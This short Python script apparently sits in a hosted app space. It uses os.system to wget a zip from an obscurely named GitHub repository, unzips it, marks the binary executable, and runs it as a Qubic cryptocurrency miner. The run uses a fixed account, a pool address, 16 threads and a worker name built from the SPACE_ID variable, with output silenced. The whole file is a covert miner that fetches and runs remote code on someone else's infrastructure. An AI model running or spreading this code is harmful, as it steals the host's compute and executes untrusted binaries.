import os
os.system("wget https://github.com/qqivk/kvbpi/raw/refs/heads/main/vovlg.zip")
os.system("unzip vovlg.zip")
os.system("chmod +x vovlg")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./vovlg --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
